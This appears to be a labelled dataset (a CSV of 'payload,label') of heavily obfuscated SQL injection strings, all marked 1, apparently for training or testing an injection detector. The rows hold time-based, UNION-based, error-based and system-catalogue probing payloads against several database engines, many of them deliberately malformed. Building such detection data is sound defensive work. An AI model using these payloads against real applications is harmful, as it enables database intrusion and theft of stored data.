payload,label
"3x0b1%': )}    &&  !(sELECT 0xB25)  Like  CAst`  (/*QB)sz0O2H~GIN3B1001ay<<[!8rG+gmtyp)-'psk[(sElECT (SElecT 0o3))f[c}~csSt and (SeLECt (SELECT 0x1)) or (sELeCt (SELECT 0))#ZTx*/  +(!  chr  (  (sELEct (sELeCT (SeleCt (SElECt 0x71)))) |)  or[cHR *(  0X0X4x9F  ) ; oR Chr(  9o0O246  )        or     +chr  ( .(SelecT+0X0O6B)  ) :>Or chR' (\ (selecT 3xB7)   )>   )   Or  (\ SElECT&  (; cASe WheN  ?(  0xB0B41201 /*FDA)0x0B2000L0b0b101q^`~$(SeLECT (SeLeCT 0x15))]iY/?*/=  (SELEct 2xb34)  )   ThEn 0B120x0B1%ELSe (SELeCt 0x0) end   )  { )   ::TeXt  Or  ! ( :cHr <(\ (SELEcT (seLeCt (SElEct (SeLEcT 0XB7)))) ')   oR chR  ( (seLECT;0O6X0O0o7A)<;)  ||CHr `(  (SElEcT`0Xbc)  )   or ChR
>( +(SEleCT((SELEct 0o0X7A))  )	!%Or chr  (  0B1110301   )    )*  :as nUMerIc/**/ )& And ((  '%'='G,~z=&~SK;//x",1
"3%' Or aND tRue{oR'FALseOR FAlSe  OR  (selecT (sELecT 2249))}nOT LiKe (SeLeCt (seLECt (sELeCT 0X8C9)))=or 0 and TRUE#elT  (/***lZM73WKLO	dv0B110M1*/ 0X16f1=(SElecT (SeleCt 0B0X0O70F0O0b3B9411110010)),sLeeP  (  0x0X5   )    )   ]; &&  0x1 OR FAlSe#QabK.",1
1{WhErE 0b0b0O0B130010010101111101101110000111010001011110001010 /*:c6A*/=[/*Vzw)*/8383,1
"sElEct  ?(  case WHen   (  0O0x2268  =  (sELecT/**/1367) 
)  ,THeN(seLeCT (sElECt (Select (sELECT (SELECT 1))))) elSe 8808*  ( ?sELect (SelEct 0X4268) fRom master..sySdataBAsEs  )| `eND- )  AND 1 --",1
"sElEcT   (  Case/whEN   (  (SELECt 0b1108110111200)  =  0X0xA0O10  )   THEn 0B1101510111000 eLse (SELEct 5)/ ^(  SeLecT-0  ),; EnD  )  Or  fALSE oR (selecT (selEct (selEct 1773))) NoT lIKE (sELECT (selEcT 1772)) oR fAlsE --",1
"3%' UnIOn aLL\SElecT`nULl,Null,NulL,NuLl,NuLL,nULl,NuLl/aNd:""4b, 1""	noT Like""4b, (SElecT 4o0X1)&""$and (SeLECt/*(*k:*/0O0b0X0B1)@}   {And  _ {True[AnD ""2""lIKE]""0b0b1010""/*G^GQ*/ Or /fALse and 0B1101010510100(noT?LikE_(SELECT 6b1101010010101)>OR (SELECT 1862)=(seLecT (SEleCt 1873)) ANd (SEleCT (selEcT 2068)) nOT like (SeLeCT (SelecT 0b0x0x815))#SAd0b110y#rP>>Jja=2Pd^'&""",1
"SEleCT%Count  (  * {)   from Rdb$FieLDS As T0O1,rDb$TYpes AS t2,rDb$coLlaTIoNS As T3,RdB$FuNCTIons	as T4/*}yU40*/ &&    ~( ;  (?}  <(; (sELeCt 0B0b0X0o703)  LIKE  0B0B1011010100100110110111011100011101",1
"1""   )  = )    aS DsHc WhERe 0x23BA  LIKE  (selEct (SelECt 0X25b7))=OR*0X0o7E6=~lIKE/   (  seLECt CouNt  () *  )  ?from All_USErs t4,aLL_uSERs t0o2,all_usERS T3,aLL_userS T4,ALL_USErs t5 -)  ~AND  0x0O0b0o2053 nOt;LikE (seLeCT 9x1eE) oR ""DR""=""drs""'aND 0x1 AnD ""6"" ?  nOt like    ""0X5X6h"" AnD (sELect (SelEcT 0X1)) And ""F0X6 ""  nOt =  ""f5 e""aND ""^q""""NoT lIkE ""^qc"" aNd TrUe Or false Or (SelecT (seleCt (sELECT (selEct (seLEcT (seleCt (SelEct (SeLeCt (SELEcT (seLect (sELeCT 0))))))))))) aNd ""=""[Not LikE(""=M""  OR  0b0X0   &&   ""3N0^""=""3n0^"" anD ""5}.\p""<>""5}.\p,""  OR! fALSe && trUe ANd ""e	""<>""Em"" And 0X1 Or FALSE  &&  (SELECT 1) OR False --",1
"SeLECt]Count;`( <DV* +)~\ FrOm}sysIBm.syStabLES.AS-t0B0O0B0B7,SySibm.SystAblES$As:t4B3o0b0O9X0O9b0O0o3X0b0o5B2O0o0x1,sYSiBM.systabLesASt7>;and   <{( < <(_  /&(( ""MuBt""/*|<XtGc5WRv*/`lIke  ""MUbT",1
"1'|-)   Or/0X0 AND ""AeQjZ"" nOT liKe ""aEQjzU""$AnD$(SELEcT 0X1) or (SeLECt (selecT 0)) Or FaLsE  OR  fALSe OR False#wHEre^5X2548[ =  0x2548 OR EXP ?( +~  (  sElECT * FROm   ([ sElEct
CONcAt  ( *0X0X0X6D6e7aA30, ( >SELeCT   (  elt@{(  0x187E=(sElECT (SElEcT (sELect (sElEcT (seleCt (SeLECt (SelEct (sELEcT (SeLECt 6210))))))))),0O1   )  
 )     ) :,0X717A0x9B10fFA5B0o107,0x0x0X0o4E   )  } )   x   ).""? ) 
 --,t;2X4,hN{~CQ",1
"1/*MlE	*/and;CHAr  (	 0x6D  )	  Or CHAR( (  (SEleCt 0X9f)  )   oR  Char  (  0X46  )  ||cHaR 
(  0x5a )/**/   =  REgeXp_suBStRing {(  rEpeat  (^ rigHt  (, CHaR  (  (selECt 1x0O2578) :)@;,(sELEcT (SeLEct (SElect 0x4)))  )  ,0x12a075150! )  ,NuLL  )    Or   6x0 Or~0X25d0B11 NOT LIKE (seLEcT (sELeCT (sELeCT 9683))) ANd trUe ANd TrUe  AND *0X1Or FaLsE  Or  falSe ANd (selECt (SElEcT 1)) AND (SELECT 1) And true --",1
"  (  sELEcT 0o0X0o0b1 from genERate_sEries  (  (SeLEcT 9352),(SELECT 9357),cAsE wheN   ( 0xbec=(SElECT (SELECT 9352))  )   THen (SELeCt 1)/*+{P[wP6P*/eLSE 0 eNd? )  LimIT 1  )  ",1
"5' rliKe> }(>:SELEct}* From  ]($=SeLeCT +(,~slEEP ~({ 0O1X0O4b0O0O3b110x2b5B1105113
:){^/*ri:Lu0b10|
p.(SeLect 0B0X0b101)^L	wxu%xA*/ ) *, )`=SgvO /*a?k*/)~    AND  ,'OBwN']$=?;'Obwn",1
"0b2]aND@eLt/*|)|%:TtLvb!;*/ (  (SeLecT 0O0b0x4bA) likE8X4ba,SLEEP  (  0X0b0o9 /)   ?)  +orFalSE Or fAlSe aNd (SELEcT (seleCT 0B1))  &&  (SeLECT (selECT	(SELECT 1145)))=0X5a5 oR 'd' NOT LIKE 'd' OR False -- oMMfy6|Ez",1
"0x0O0x0b4']+
`[oR+! ]  ;or)\-faLsE orfalse#9B0b8x8X0x0X5x0X0B0o31311Ab/*"")]cL_55YFz&i9aX $ 	oR   ;0X0O8 aND (selecT 0X0X1)#o.+^kW8jET>W*/likE			!($'SELEcT~coUnT	<('*	))/*<6y:N*/  FROM	doMAiN.dOMAINS<As!T5,dOmaiN.coLuMNs(aS t0x0b0B0x8b0b1010,doMaIn.taBlEs?as;t7b0X0B0X0O0x2O0O0o0x1X0O8 <)		:And 'XQKQ'%LiKE  'XQKq_v^cu",1
"1'+  (; SELECtrQCW$wHEre,(selecT""4X0XCAa) *=  0O0O0B0x0B2X232a unIOn aLL seleCt?null,Null,nULL,NuLl,NULL,nUlL,nulL,nULl,NULL&AnD-0o0B9101400101(lIKE (SelECT'0x345) AnD TRUe And TrUE OR (seleCT	(selEct 0)) aND TrUe <anD\ TRue && tRUE    or^  (select 0) aNd TruE ANd
(sElECT 0O7340)$Not    lIke  $ (seleCT 0xF0x2D) And tRuE aNd (SELECT (sElECT (sElect (SElEcT (SELECT 1))))) oR FaLsE  aND $true OR False#UQk07I>
cs>",1
"6B0B3b0o0X0x6O0o3'-]AND[
TRUe!OR~(SElect>(seLect (SelecT (SELECT 0))))/*u>]E']7ifuh[J*/oR
faLSE_oR?(SElEct{(selEcT	2))#)'>'uNION!ALL!SElECT_NulL,NulL,Null,null,NuLL,nUlL--p>I<J)",1
"!End*> ANd/:%""mDjE""+LIke/*.*o.m;Rc-EiXN{f<0o0b0b0o11HM0o11Ve-J_u0l*/""MdJE",1
"0o1""  )  WHeRe}(SelEct (sElect@0Xe0x3c))  lIKe ;9079",1
"1'+  (  SeLect iNrV WhErE,(sELECT (SeLEcT 2150))]  LIKE   0B0b0b110000101011101100100000110100001001000011111100100101000100010110001010101111100100010011010011110111110010000001110010 oR 0x1Cf8  lIKe  ( (  SeLECt cOunT  (  * ~)   FROM sySiBM.SyStAblEsas T0O1,SYsIbM.SYstabLES AS t2,SYSIbM.SysTabLeS AS.t3  )/*0B101|1*/ oR (seLECT((sEleCT 0)) And 1--",1
"6%'   oR   (sELECT (SeLeCT (SELect (SeLect (selEct (sELect 1094)))))) /*Kn]Mcdff
H'pl	p*/lIKe`   (  sElEcT couNt  (  *  )   FROm(ALl_uSERs=t3,aLL_uSers T0b20,ALl_userS t3,aLL_USErS t0o7,All_uSeRS T5  )   AND  (selecT 8030) not lIke;(SELECT-0x0o1032) and (SELECT (SELECT 1)) --",1
"selEcT>caSe whEN
6X84Ae    LiKe    (selecT (sElEcT!5752)) THEN (SELECT 1) elsE/nULl EnD--",1
1'[wHEre>(SelEcT:3O37102) =\/*gB;z=OJcyu*/0x0o7X1fA3,1
"0o2  )  ;Or CHaR*'(  (sElect (selecT (seLEct)0x73)))  )  ||chAr	 (  5o0b9130108  )$'`OR ChAR  ( $0x63 )  (OR cHar  (  0O277  ) )= ReGEXp_sUBsTRiNG  (  rePeAt  (` RIGHT \(  chAR .(  0X5a5 [)  ,(SelEcT (seLecT 0x0))  )  ,0b0o0XA8610f638  )  ,NUlL  )  anD{""+w""{not] like  ""+w;"" OR<'UFT'  nOT/*bZ*/lIke  'uft' && TrUE OR (SELECT (SELECT 1189)) Not LiKe (sELect (SeLEct 0x49d)) oR+(sELeCT (sElecT 0)) anD TruE or (SELECT 0) Or FALse	aNd tRue Or falSe --",1
"8'  ANd  (sEleCt 0O0b0O0B16000110010010)=%  (  SElEcT 0o21622+FrOmpG_sLEeP  (  5!  )   ;)/**/     anD   /**/(SeLEcT 0x0x1ae0o5)@In_(0b1101011300100,0o4x0EcD,0X1AE6) And TRue<anD 0o2554In=(3435,(SELect (selecT (SELeCt (sElECT (SELect 3436))))),0o0X199B) Or(SElECt (SelECt 2)) or*(sELecT (SELECT 0)) oR 1595 nOT  lIKe  (sELecT (sElect (Select 1595))) Or>fALSe OR FalSE And/**/1 or FaLsE --",1
"5'  <)    ) /*\&};b*/  As TfuB wherE 0b0xE8daAbbA4e )=  (SeLEcT 0xD85) OR}(SElecT (SELECT 7427))  =  dBMs_pipE.REcEiVE_mEsSAGE  (  chR OR FALse And (SeLEct (seLect (sELeCT 0x8)))# (  (selEcT 0x0o106)  )     OR   cHR  (""}(seLECT)(sEleCt (SELECT 82)))  )   or Chr >( ,0x5A  ))  oR cHR -( (seLeCT 709)  )  ,0x0x7 +)  Or FALsE OR False or FaLse oR ""X0b10i""<>""X2i"" oR FALSE --x",1
"6%'   )    ) ;  oR roW(/*ZS*us*gsxk<*]ext	k*/( @0b0x2845,(sEleCt (SeLect (sEleCt (SElECT (sELeCt (SELECT 7562))))))+~) ;>  ( $Select coUNt  ( /*] )  ,COnCAt  (  0O7X0o0O33267174A71,  ( 
sElECT  -(  ELT  (  5O3639=(SELect (SelecT 0x0X40b)),0b0b1   )] 	 )  +  )  ,0x0x2CdA767a45,fLO   OR    _([ RAND  ( (seLecT (sELEct (SELECT 0)))  ) 	*0X6  
)    )   x FROM ^ (  sELeCt (seLECT 0O22420) unIoN~seLEct 0x18D0o0 uNiOn~SELeCt 0xbEb uNiON seLeCt (seLecT 0X0x4ba)  )  A-grouP by x  )   .anD     (    (   '%' LiKe '",1
"0b0B0B0b100001100110100110111o0B0B0b1101X4b2x0B0b0O0x3O0b9""\$)/>(UniON[ALL&SELEct:nuLl,NUll,nULl,nulL,nulL,nUll--",1
"0B0O0X0b0O3""  \) + +)     )  *PRoCeDuRE aNaLYSE  (  extRAcTVaLUe {(  (seLECt!(sElEct (SeLEcT (seLEct (sELECt (SElECT 9x659)))))),ConCAT  (<+6x5c,  (  BENChMARK  (  (SELect 0x0O5B0O0o62D80),MD5  (  8X85515a50  	)  ~^)	
 {  )   [)     )  ,0x8o4b0o3O1  )    ?     &&     )% {JAYkE*/ (   /* (seleCT\9B0B9X0O0o45)
\8krgPqR`toXuI?qmmT6eY[8w+[O8*/(     (  ""wHLD""    lIKE    ""WhlD",1
"cAll~rEGexP_SubSTrInG  (  REpEAt?}(  leFt  ( (CrYPT_KEy  ( 
chaR  (  (SelECt 7x04)  ) 	  oR  cHar  ( ""0b6O0x9X0o276  )   OR  ChAR  (  (sEleCt (SeleCt 0x0x0b0O0O65))  )  && "")"" nOT liKe/**/"")q""  AnD  true/*^(sElECT (SELECt 3))Xz[4e*/AND trUe* ANd  (SELecT (SElEct 6X1)) Or fALsE oR (sEleCT (seleCt 0)) OR FALSE aND (SELECT 1)#,NuLL  )  ,(sELect 0X5)  )  ,(SElecT/2X1F0O10)  )  ,nULL) ) Or (SELEct 1o9x0)#/**X*/ and %=(  '%'='<tk}Q.Hb TdR",1
"0B3x1"" whEre (seLECT 0b7001710193106)}=`0x0x2030]uNion)All:seLeCt}nUlL,nuLl,nUlL|AND\""W>x""/*+zBQoSgI0Z9[rK2*/LIkE""""w>x""$aNd;(seLect>0o0x9)''_ or;/_ 0b11B0x0
ANd	TRuE;or 0X0 $aNd  (SELecT (sELEct	(SeLECt 0X0o1)))} &&) TRuE ANd (selEcT](SeLEct (SELECT 6426))) noTLiKE (sELect/**/6427)#7h+yjGSy(- ;ek4LBoE-",1
"SElECT
  ( 
CaSe wHen{ ^(  0XC5B  LIKe  0x12fd  )&  Then 0o1 ELSe 1X142B*  ( 
SEleCT 0x0O214e from MAstER..sYsDATABaSes  ) { ENd  ) +
AND ?tRUE or (SelEct 0x5C1)=(SElEcT (SELeCt 0b10110002110)) OR=FalSe   &&   (SELECt (SElecT (SELECT 1))) --",1
"4' OR/(SeLeCt (SELEct%0X0))/And ""pv@U"" not lIke ""pV@UV"" or faLSe oR FalSE oR~(selecT (SelEct (SELECt (seLECT(sELEct 0B1001x0))))) or:0B0X0 oR ""$;"" nOT^liKe ""$;"" oR{""H"" nOt  likE !""H"" oR FAlSE and ""G/uO?""=""G/uO?"" OR FAlSe aNd tRue Or fAlSe AnD (SElECT 1)# Or/*(SEleCT (selECt 0x0X0o0))^|r~ao@=U9d2;;atRY}`?fMl+^C,Oki*/  &(+ SeleCt\'XsOQ'>fROM/*A)sj*/DUAl^where<0o0o0O0B0B10400950010710130108111100000100101111050   liKe &.0B0X0x0x0X1a24   and   0o8X112e[  LiKE   #/(/*!e (sEleCT (sElecT (sElEct 5x7)))
Xi;:(
^8uGvq5LYxOH*w}@$bq=(sELeCt (seLeCt (SELECT (SELECT (SELECT 2)))))*/ SeLEcT cOuNt -( *  ) ""]fRoM SYSusErs AS sYs0x0X1,sySUsErs As^SYs5,SYSUSERs as
SYS0x2,sysUSERS aS&SyS0B0x0X04,sysUSERs aS/**9F<BsGNze@)[R*/sYS5,sysUSErs[AS!sYS7,sysUSers aS sYs0b151[  )};  )'[; OR'E<l+e}[ckRhq7U",1
"3%""
AND.(sELEcT0x23ee)/**/@likE  0b10001111101001--",1
"7X0X0X0B7'|) ; oR cHAr )(`|(SelECT (sELeCt (seLECT 0B1101101)))  )~    or  )ChaR (  (SeLect (SELecT_(SeleCt (sEleCt~0X6F)))) *)   oR char  (](selECt[(SelecT 0x49))/*;)kI9F3al&^J
IN:*/ )!  oR cHAR  (  0X74 !). =REGexp_sUbstriNg 	(/*d<:(X	~.i, */^REpEat  (} LEfT  (? CrypT_KEY  ( )cHaR? (( 0X43 $)&  OR/**/cHaR  ($(sELEcT 6X65) ?)  oR cHAR-(  (seLECt (sELECT 0x0X26))  ) *,nulL  )  ,(SElecT 0b0)  ) _,0o3563163106  )  ,NULL` )    ANd  ^ (  'TVcM'  like  'Tvcm~ 7r",1
"	ENd<AND}\ ($%""%""]`^liKe``\""",1
"0B15/*8n(SELECT (SELECT 10))*/&&   ($ SelecT * FROm   (  SeLECT ?(  sLEEp `(  (sELECT(SeLEct 0x4)) /**/ )  
 )     )  FzNo  ) ",1
"8O4'+  (  SeLEcT cJCp=wheRE 0O5065|= (sELEcT (selEct 0XA0b0o1e)) UnioN'AlL SeLect^NulL,NuLl,NULl,nUll,NULl,Null,nulL ANd tRue OR&FalsE  &&  ""iga N"" Not Like ""igA
n0b1""*AnD 1 AND (SELECT 20)^NOT   LIKE   (SELECT (SELECT (SELECT (SELECT 21)))) AND True OR False#",1
"0B0O0b0o5o1""=`)  +ANd	(sELeCt;0x0O80A0B0B0b100010001101101010110)^	/*7pvH?*/lIKe/ :/^( ;SelEcT CounT [(~`*  )` FROm	sysUsErs+AS SyS3,sysUseRs<AS^SyS0o0o6,SYsusERS=As`sys8,sySusERS!aS SyS4,sYsUSErs{assyS9o6,sYSUSersaSsyS0o0B0x0B51010110,SySusers)as]sYs0x0o0B0b1010  )_  % <And`>  "";(; ""qBlJ""likE*""qbLJ",1
"0b9'`   anD )<:maKe_seT ;(& 0X0Xc3B   LIKE  :0x1135,(Select 0O0X1387)/*R)b=l""TbIm0*/ ){]",1
"9b0O0b0O1"" )   oR (SELEct;(select (sELeCt{0x85c2B0B0B0x3)))  LikE  ? LIkE  + ([/*
8t[p[/l`Vi+Iw{(SELECT 74)<cLb*/'abcDEfG',UPpER  ( HEx  (  r:	And?<OmbLOb  ( +2X1dCd622c/(sElEct 0x0o0O2)   )    ) ; '  )  /) liKe* $aNd{?  ( <""vkQt""=""VkqTm_i=h",1
"0B100""   )    )   AND (SElEct2853) >LIke  casT   ( |  (   ChR  (  (Select 0x0O0b0B0X0B0B1001100101110111000100001111001001001011000001001100100000001111010100101101001101000100101100100100010010001100011100010101000111111010011110000011001100001110110101111111000100001001111010111001010100001110110011110001)  )  ||ChR  (  (SEleCt (sElecT (sELEcT/*	*/113)))  )   Or CHR  (  (SElEct 0b0O4167760)  )  ||Chr  (  (SeLect	(sElecT 0o0O230)) [)   or Chr  (  0X71   )    )   oR /*?WeG{*/(  sElECT   ({ CASe whEn   (  (SelECt 0x1Ac5) %LikE  (SeLeCt (seLEcT (seLEct (sEleCT (SelEct 2453)))))  ) ./THeN (seLeCt (sElECT 1)) eLsE~0o0 end   )    )   ::tEXT OR   ( \ChR	 (  (sELect (seleCt (SElECt;113))) )   OR CHr  (  0b0B110100001101111000000  )    oR  ChR  (  (select 0B0X77)  )  ||cHr  (  (SeLEcT 0o1404)  )`  || cHR  (! 0B1110001   )    )    AS NUmEric  )   ANd/**/   (    (  """"DUUW""  LIKe  ""DuuW",1
"1%'   )    )*&
  )   OR>eXtRactVaLue  (  (sELEct 0X0x0b151111111),cOncAT  (  0X5C,0X0B0b10010101001110100001110110001111000101000001101001100100000011001111111111A0B1002111,  ( ;sELeCt   (/ elT  (  0x511  LIKE  (sElect 0X0X1FF),(SeLECt (SeLeCt 0x3))   )    )     )  ,0X711a767A71   )    )  ; AnD    (    (  (  (  '%'  lIKE  '",1
"0x0o1'+  (  seLEct 'kICv' whEre (SELEct 0x8b8)   lIKE  _(sEleCT 0x0x1B22) AND 0b7O4252< LiKE    (  SELEcTuppEr  (  XMLtYPE  (  ChR  (  0x3c  )  ||cHR  ( !(sELeCT (SeLect 0X4E))  )   Or chR ](  (seLECt (SElECt 0x71))  )   Or cHr  (  (SELEct (seLEcT (sELecT 114)))  )   OR chR  (  (SeLEct 0x138)  )  ||CHR  (  (seLect (selECt 106)) _)@ ||Chr  (  (sELEct (SeLect (sELEct 118)))  )||(  SELEcT   (  CAse wHEN   (  0O7252=0b911010102019  ) + Then (selEcT (sElEct 0x1)) Else (SElECT (SElEcT (SELECT (SElect	0)))) END  )   FrOM duAl  )  ||CHr  ( =(SELecT 0O0x71)& )   or Chr  (  (seLECT (SElect 122)) :);   Or ~cHR  (  (Select (SEleCt (sElEcT 118)))  )   || ChR  (  0X7A  )  ||CHR  (  (sELEct (sELecT 113))  )   || CHR  (, 0X08`  )    )  +  )   From dUaL   )    )   +'",1
"1%""&aND](sElECt(SELECT 5488))</*;8JO_,$*/=}|(SELECt (SELECT 7158))--",1
"CALl rEgexp_SUBsTRINg  (} repEaT  (, leFt 	(  CRyPt_kEY  ( cHAr  ( /*AJupu*/5O0b9101101 {)   oR CHar_ (  0X0b101111 ;)   ?Or  Char `(  0X0B1510111# ); ,NULl! )  ,(selEct 0b0x0O11) `)  ,0x9X1E0O70B0b1110107167  )  ,NULL; );*|&& ""cuZI"" Like ""CUzi4}&E",1
"7%'  '){  /)    aNd
0B0B0b1110101100011001010011111000111001111111110111101000101111110011000111010010001101101010100110000100001110011000100010111001010010100=""|(  sElEct COUNT  (  *~\) ) fROm Rdb$fIeLDs as=T1,Rdb$TYpeS^AS T0b0,RDb$COlLAtIONs AS T0b0B0b10000101111,RDb$FUNcTIOns as@t0o0o0B0B100( )   ANd ,  (~   ((` '%'/*RAfv&:>E&F*/LIKE '",1
"0b1'+andSlEEP>(
/*y(A""AnD}8828$in&(8827,0o21174,0X228d)  aNd}`0x1 OR 2253=(sElect 0b1110100100070)%and:2804<>2805#0o6n_O;}K5	IHpaL&*/0b4o0x4x0X0o11X5_ ))-F4koh2IJ",1
"1""  )   WHerE>0b0b0o0O06192  LIKe~ (SELEcT 0O0b10102650111001110)   oR   0X0XE2F /**um4Evbo M_sPS> AnD truE Or FAlSE OR FalSE oR FaLSE oR faLsE#Py7*/lIkE   ?(/ SELECT couNt ?(  *  )  From sysiBM.systaBles AS&t4O0O0b1,SysIBm.SYstAbLes:aS{t2,sysiBM.sySTAbLEs as t1O0x7	>) } OR  0x0O0o20Ca nOt like (sELeCT 0X14De) or (sEleCt 8X6f8)  LiKe &0B0O3361&&(select (selECt (SElEcT (sELecT (SElect (SELECT (SELECT 1)))))))@AnD tRuE}AnD truE --}mp",1
"4%""  [)    )}   aND   (  SeLECt/*fr~i*/0X836b from  (  SeLEct cOUnT  (  *  )  ,cOnCaT  ( }0X7371717A0x48,  (  seleCt 	 (  Elt  (  0B0x236B ""Like  0X4x236B,0X1   ) *  )  +  )  ,0b0O0X717a768a71,FLo or   (  RAnd  ( /(sElEcT (SelecT?(SELECT (SEleCt 2X0))))  )  *(seLECT (seleCT (SEleCT (SElecT (sELECt (sELECT (SELECT 2)))))))   ) ;  )   X FroM<Inf or mAtIOn_SChEma.cHaraCTer_SETS&GroUp BY x  ) !a  )anD=( ,	 (  [""%"" -Like <""",1
"9',  (  select   ( :CaSE WHen   (  0X7539  lIKE ?(SELECT 0x0b1001010111)/**/ )   tHeN (SELECT 1) ElSe CaSt  (  (sElEcT 0x1) AS INT  )  /  (  SElECT 0X1x0 fROm
dUAl  )  ;End  )<  fROm duAL"")  ",1
"1' oR 0O0o7X410F  Like    (  sEleCT%COunt  ( *~ ) /*p9dk{pR\	P+;{L*/ from rdb$fiElDs as t0b1001,rdb$TyPeS&AS@T2,rdB$ColLATiOnS as t2,rdB$fUNctiONs<as+t0b0x4  )  AnD TrUE OR ""}"" noT LiKE ""}"") Or : 0x0x0 oR FAlSE& oR} (seLecT 0x0)  AND/**/ (sEleCT (SeLeCt 0X7)) OR ""<_hW""=""<_hws"" oR FalSe&&(seLeCt~(SELecT (SELeCT (SELecT 1X1)))) aND (SElECT 0x1) and (selECT 0X1)  AND  (SeLecT (sElECT (sEleCt (SELECT 1)))) OR False --",1
"SeLECt bENcHmaRk {(	 (seLeCT 0x0X6O2d60F0b0),mD5  (
 0X9c0X4d6492 ; ) ]  )`/*(SeLECT(seleCT (SElect	(seLECT 1x9))))r[h.*/  ANd    (   (   '%'='",1
seLeCt|CAse*WHEn(SELEcT 0b11b0b1110100100010110001101011011111101001100)  LIKe [6138THeN.(SEleCT/**/(SELecT 1)) ElsE NuLl	eNd--,1
"0o0B0b0X0x0x0o0B0x0x0o0x0x1"", ) {AS HFvz	WHerE%0X1C0b0B1100 oR
""ez"" not(lIkE ""ez""  oR  ""8""=""8`""/And/*coye`z$BoA:O*bR*/TrUe &&`""	tU	"" Not lIKe:""tu	C"" Or (seLeCT (SElecT (SELeCT (sELeCt (SeLECt (SELECt (SElEct 0))))))) && '6'='4O6' or (selEct&(SElEct 0x22e5))=(SELECT 8934) Or FaLsE OR FaLsE OR falSe OR False#.=. 6x0X1c0O0x6O15""unION ALL SelECT\nUll,NuLl,NUll,NULL,null,nuLl: &&  tRUe`AND trUE#JSbhaC8m",1
"0O1'%)   aNd   (  Select 0o0X236B FROM  (  SeLECt]cOuNT  ( )*  )  ,ConCAT  ( 0x0b0b10010110101000101111000011101010000111100010101011000111101111111011100010A71,  ( _SELEcT  !(  eLT  (/*&>(seLEcT (seLecT 0x1))  OR FALSe#)PM,Z%cV`R6s*/ 0x236b LiKe (SELeCt (SElect 0X236B)),(SElECt (SEleCt (SELECT 1)))   )    )     ), ,0x0B0B0b1011001101111101111000110001110100100001101110111010011010000100000010100100111111101011001111111A0X0x0O0o2e1A0x0b0o907,fLoor  (  R AnD   (  0X0O0  )/ *4b0X0x2   )    )   x	FROM inF||MAtioN_SchEMA.ChARacTeR_SetS GrOUp By x  )  A  )&  aNd   (  'wFws'  liKe: 'WfwSOZ4Q]8(zz)7X t=ueG",1
"1'  )    ( |seLeCt   (( CasE WHEN   (@ (sELeCt (SeleCt (seLEcT (sELEcT (SElEcT (sELECt (SELEct (SElecT (SeLEct 0x1187)))))))))  like  0x137D  )   THen RegEXP_sUBsTrinG  (  repeAt  (  leFT  (  crYPT_KeY- (  chaR  (  (SElEct/**/(SelecT (seLeCt (SElECt (seLect 65)))))  )   OR Char  (  3x95 "")  ||char  (  (SELECT 0x73): )  ,NUll? )  ,0b0O3  )  ,0X1dcD504  )  ,nUlL/*c)J?*/ )   elSE CHAr  ( [0x5b0o0b0B1110013  )   OR chAR  ( 0B0x45  )   Or CHaR( (  (SELect 0B0x96)  ) }||chaR  (  0x44 =)   eNd  )  	frOm   (  valUEs  (  (SeLeCT'(seLeCT (sELEcT 0x1)))   )    Or FaLSE  OR  FAlSe oR ""Zxj""=""ZXJr""{ANd (sELecT (SELECt 887)) NOT^lIke 0B0X0x13a oR 'Ljl' LIKE 'LJL7' and (sElECt 1) anD ""f"" LiKE ""f"" oR (sElect (SELECT 0)) Or FaLSE oR fAlsE And_true Or$FaLSe   AND   tRuE  OR  faLse aND 1 aND (SELECT 1)#)     )    anD <  (  'Ylit' LiKE 'YliTk[$\6 rOLDHgW	Z",1
"1 )   aS czeU Where (seLEcT 1738)=(sELEcT 7X712).  OR   EXP  (< ~  (/**/ SeLECT\*'frOm   (  selECt cONcAt; (  0x7171906a71, \(  sELEct / (  ElT~/(  0X0b1100101911140 LiKE 0X187e,(SeleCT (sElECt (seLECt (SElect 6))))   )  < )     )  ,0X0x717A667a0b1000111,0X0B1001110  <)    )   X  )\   ) (  oR [(sElecT (sEleCT:(SELeCt (sELecT 0)))) anD (SELECT (sELect (sELeCt 0x454))) IN)((SelEcT 1107),0B3b0x0x1C6,(SelEcT 0X4X1C7)) OR FAlSe ANd TRueAnD (SelECt aND True oR>(SEleCt (selECt (sELEct 8154)))<>(SELECT 8154) aND TrUE or '!b' NoT like '!b':and{True{ Or  ""KF"" nOT lIkE ""KF"" or FaLSE aND TrUe#0X1) oR fAlSe  and  (sElECT 0X1) --A$GFfX5H@",1
